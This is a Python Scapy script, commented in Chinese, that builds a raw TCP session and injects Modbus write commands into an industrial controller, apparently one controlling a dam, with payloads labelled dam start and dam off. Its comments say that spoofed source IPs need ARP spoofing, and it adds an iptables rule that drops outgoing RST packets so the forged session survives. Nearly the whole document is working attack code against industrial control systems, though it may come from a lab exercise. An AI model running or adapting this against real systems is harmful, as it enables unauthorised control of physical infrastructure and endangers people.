#!/usr/bin/python

############################################
# 使用 Scapy 發送 Modbus TCP Payloads
# 若使用 非自身IP，需 ARP Spoofing
############################################


from scapy.all import *
from time import sleep
import subprocess

# 避免被自動送 RST 中斷，用 iptables 擋掉
# sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.1.66 -j DROP # 192.168.1.66 改我的 IP

target_ip = "192.168.1.5"  # Target IP
source_ip = "192.168.1.20"  # Source IP
target_port = 502           # Modbus port

# 這邊用來擋RST避免被中斷
def setup_iptables(source_ip):
    try:
        # 用來添加iptables規則，阻止發送來自特定IP的RST包
        subprocess.run(['sudo', 'iptables', '-A', 'OUTPUT', '-p', 'tcp',
                       '--tcp-flags', 'RST', 'RST', '-s', source_ip, '-j', 'DROP'], check=True)
        print(f"iptables規則設置完成，已阻止從{source_ip}發送RST包")
    except subprocess.CalledProcessError as e:
        print("[ERROR]設置iptables規則時發生錯誤:", e)


def reset_iptables(source_ip):
    try:
        # 刪除先前添加的iptables規則
        subprocess.run(['sudo', 'iptables', '-D', 'OUTPUT', '-p', 'tcp',
                       '--tcp-flags', 'RST', 'RST', '-s', source_ip, '-j', 'DROP'], check=True)
        print(f"已清除iptables規則，不再阻止從{source_ip}發送RST包")
    except subprocess.CalledProcessError as e:
        print("[ERROR]清除iptables規則時發生錯誤:", e)


def sendModbusPayloads(cmdList, target_ip="192.168.1.5", source_ip="192.168.1.20", target_port=502, delay=1):
    # TCP 三向交握
    ip = IP(dst=target_ip, src=source_ip)
    syn = TCP(
        sport=RandShort(),
        dport=target_port,
        flags='S',
        seq=100,
        options=[
            ('MSS', 1460),           # Maximum segment size
            ('SAckOK', b''),         # SACK permitted
            ('Timestamp', (0x1ccf9, 0)),  # Timestamps
            ('NOP', None),           # No-Operation (NOP)
            ('WScale', 5)            # Window scale
        ]
    )

    # 發送SYN封包，接收SYN-ACK
    syn_ack = sr1(ip/syn)

    # 創建ACK封包
    ack = TCP(
        sport=syn_ack.dport,
        dport=target_port,
        flags='A',
        seq=syn_ack.ack,
        ack=syn_ack.seq + 1
    )

    # 發送ACK封包以完成連線
    send(ip/ack)

    # 初始化序列號和確認號
    seq = ack.seq
    ack_num = ack.ack
    trans_id = 0

    for cmd in cmdList:
        print(f"---------\nSent: \n{cmd}\n---------\n")
        modbus_data = bytes.fromhex(cmd)
        modbus_packet = ip/TCP(
            sport=ack.sport,
            dport=target_port,
            flags='PA',
            seq=seq,
            ack=ack_num
        )/modbus_data

        # 發送Modbus TCP packet
        sr1(modbus_packet)
        response = sr1(modbus_packet)
        seq += len(modbus_data)
        ack_num = response.seq + 1
        print(response.show())

        # 收到後回覆一個ACK
        ack = TCP(
            sport=response.dport,
            dport=target_port,
            flags='A',
            seq=seq,
            ack=ack_num
        )
        send(ip/ack)

        sleep(delay)

    # 發送最終ACK以關閉連線
    fin = TCP(
        sport=ack.sport,
        dport=target_port,
        flags='FA',
        seq=seq,
        ack=ack_num
    )
    send(ip/fin)
    fin_ack = sr1(ip/TCP(sport=ack.sport, dport=target_port,
                  flags='A', seq=ack_num, ack=seq+1))
    print(fin_ack.show())
    # 關閉連線
    close = TCP(
        sport=ack.sport,
        dport=target_port,
        flags='A',
        seq=seq+1,
        ack=fin_ack.seq+1
    )
    send(ip/close)

# 創建Modbus TCP封包
# nothing   00e80000000b01420200060000f0960001
# 水壩start 6dca0000000e01420300090000006400010001ff
# 水壩off   6dca0000000e0142030009000000640001000100


cmdList = ["00000000000e01420300090000006400010001ff",
           "00010000000e0142030009000000640001000100"]


setup_iptables(source_ip)
try:
    sendModbusPayloads(cmdList)
except Exception as e:
    print("[ERROR]傳送Modbus資料過程中發生錯誤:", e)


reset_iptables(source_ip)
